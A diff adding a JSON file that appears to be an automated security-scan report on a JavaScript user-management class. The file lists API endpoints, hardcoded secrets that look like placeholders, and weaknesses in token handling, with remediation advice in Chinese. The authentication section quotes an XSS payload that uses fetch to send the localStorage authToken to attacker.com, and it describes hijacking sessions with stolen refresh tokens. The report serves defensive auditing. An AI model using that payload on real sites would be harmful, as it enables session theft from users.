@@ -1,0 +1,143 @@
+{
+  "api_discovery": {
+    "success": true,
+    "data": {
+      "endpoints": [
+        {
+          "path": "/v1/auth/login",
+          "method": "POST",
+          "authentication": "None (Public)",
+          "parameters": [
+            "username",
+            "password"
+          ],
+          "description": "用户登录和认证，返回认证令牌。",
+          "risk_level": "medium"
+        },
+        {
+          "path": "/v1/users/{userId}",
+          "method": "GET",
+          "authentication": "Bearer Token (localStorage)",
+          "parameters": [
+            "userId"
+          ],
+          "description": "获取特定用户的详细信息。",
+          "risk_level": "medium"
+        },
+        {
+          "path": "/v1/users/{userId}/profile",
+          "method": "PUT",
+          "authentication": "Bearer Token (localStorage)",
+          "parameters": [
+            "userId",
+            "data (profile payload)"
+          ],
+          "description": "更新特定用户的资料信息。",
+          "risk_level": "high"
+        }
+      ],
+      "summary": "该JavaScript代码定义了一个用户管理类 (UserManager)，其中包含三个与后端API交互的端点。这些端点主要用于用户认证、信息查询和资料更新。除登录接口外，所有敏感操作均依赖于存储在 localStorage 中的 Bearer Token 进行认证。更新资料接口 (PUT) 具有修改数据的能力，因此被标记为高风险。"
+    }
+  },
+  "sensitive_scan": {
+    "success": true,
+    "data": {
+      "sensitive_data": [
+        {
+          "type": "API Secret Key (Stripe)",
+          "value": "sk_test_EXAMPLE_NOT_REAL_51HqJ8KLmN9pQrStUvWxYz",
+          "location": "API_CONFIG.stripeSecretKey",
+          "severity": "critical",
+          "recommendation": "立即撤销此密钥。所有秘密密钥必须存储在安全的服务器端环境变量或密钥管理服务中，绝不能硬编码在客户端代码中。"
+        },
+        {
+          "type": "云服务密钥 (AWS Secret Key)",
+          "value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+          "location": "API_CONFIG.awsSecretKey",
+          "severity": "critical",
+          "recommendation": "立即撤销此密钥。云服务凭证必须存储在安全的服务器端，并使用IAM角色或临时凭证进行访问控制。"
+        },
+        {
+          "type": "硬编码管理员密码",
+          "value": "Admin@123456",
+          "location": "API_CONFIG.adminPassword",
+          "severity": "critical",
+          "recommendation": "立即删除此硬编码密码。密码绝不能存储在代码中。如果需要配置，应使用安全的配置管理系统或环境变量。"
+        },
+        {
+          "type": "数据库连接信息",
+          "value": "10.0.0.5:3306",
+          "location": "API_CONFIG.databaseHost",
+          "severity": "high",
+          "recommendation": "此信息泄露了内部网络结构和数据库端口。数据库连接信息必须仅存在于后端服务中，并确保数据库不对外网开放。"
+        },
+        {
+          "type": "API Key (Google Maps)",
+          "value": "AIzaSyDXYZ1234567890abcdefghijklmnopqrstuv",
+          "location": "API_CONFIG.googleMapsKey",
+          "severity": "high",
+          "recommendation": "此API密钥可能导致费用滥用。应限制此密钥的HTTP引用来源，并考虑将其功能迁移到后端或使用无密钥的公共服务。"
+        },
+        {
+          "type": "内部API端点发现",
+          "value": "/api/admin/dashboard, /api/debug/info, /api/internal/stats",
+          "location": "API_ENDPOINTS",
+          "severity": "medium",
+          "recommendation": "泄露了内部和调试功能端点。虽然端点名称本身不是秘密，但它为攻击者提供了目标信息。确保这些端点在服务器端有严格的访问控制和速率限制。"
+        },
+        {
+          "type": "客户端认证逻辑漏洞",
+          "value": "if (token && token.length > 10)",
+          "location": "checkAuth()",
+          "severity": "high",
+          "recommendation": "认证必须始终在服务器端执行。客户端的`checkAuth`只能用于UI显示，不能作为安全控制。攻击者可以轻易绕过此检查。"
+        },
+        {
+          "type": "不安全的Token生成",
+          "value": "btoa(JSON.stringify(...))",
+          "location": "generateToken()",
+          "severity": "high",
+          "recommendation": "Token未签名且易于解码和伪造。应使用行业标准，如JWT (JSON Web Token)，并确保使用强大的HMAC或RSA算法进行签名，以防止篡改。"
+        },
+        {
+          "type": "客户端业务逻辑漏洞",
+          "value": "totalPrice: totalPrice",
+          "location": "submitOrder() / calculateTotalPrice()",
+          "severity": "critical",
+          "recommendation": "关键业务逻辑（如价格计算）绝不能依赖客户端输入。服务器必须重新计算并验证订单总价，忽略客户端提交的`totalPrice`，以防止价格篡改攻击。"
+        }
+      ],
+      "summary": "代码中存在多处严重的安全漏洞和敏感信息泄露。API密钥、云服务凭证和硬编码密码（共3项）被直接暴露在客户端代码中，这是最严重的问题。此外，认证、Token生成和价格计算等核心安全和业务逻辑完全依赖客户端，极易导致认证绕过和欺诈行为。"
+    }
+  },
+  "auth_analysis": {
+    "success": true,
+    "data": {
+      "authentication_methods": [
+        "基于用户名和密码的认证 (通过POST请求发送)",
+        "基于Token的授权 (使用Bearer Token在Authorization头部)",
+        "客户端Token存储 (使用localStorage存储Access Token和Refresh Token)"
+      ],
+      "vulnerabilities": [
+        {
+          "type": "不安全的客户端Token存储 (XSS风险)",
+          "description": "代码将敏感的认证令牌 (authToken 和 refreshToken) 存储在浏览器本地存储 (localStorage) 中。localStorage中的数据可以通过客户端JavaScript完全访问。如果应用程序存在跨站脚本 (XSS) 漏洞，攻击者可以轻松地执行恶意脚本，窃取这些存储的令牌，从而劫持用户会话。",
+          "severity": "高",
+          "exploit": "攻击者注入一个XSS payload，例如：`fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'))`，即可将用户的认证令牌发送给攻击者。"
+        },
+        {
+          "type": "Refresh Token暴露",
+          "description": "Refresh Token也被存储在localStorage中。Refresh Token通常具有较长的有效期，用于在Access Token过期后获取新的Access Token。如果Refresh Token被盗，攻击者可以无限期地维持对用户账户的访问权限，即使原始的Access Token已经过期。",
+          "severity": "高",
+          "exploit": "窃取localStorage中的refreshToken，并使用它来请求新的access token，实现持久化会话劫持。"
+        }
+      ],
+      "recommendations": [
+        "**使用HttpOnly Cookies存储Token：** 对于会话管理或Access Token，应使用HttpOnly属性的Cookie进行存储。HttpOnly Cookie无法通过客户端JavaScript（如`document.cookie`或`localStorage`）访问，这大大减轻了XSS攻击窃取Token的风险。",
+        "**安全处理Refresh Token：** Refresh Token不应存储在客户端的localStorage中。如果必须在客户端使用，应将其存储在HttpOnly Cookie中，并确保该Cookie设置了Secure属性（仅通过HTTPS传输）。更安全的做法是，仅在需要时通过安全通道（如一次性代码或专用端点）使用Refresh Token。",
+        "**实施内容安全策略 (CSP)：** 部署严格的内容安全策略，以限制可执行的脚本来源，从而降低XSS攻击的成功率。",
+        "**确保Token有效期合理：** Access Token应设置为较短的有效期（例如5-15分钟），以限制即使被盗后攻击者可利用的时间窗口。"
+      ]
+    }
+  }
+}
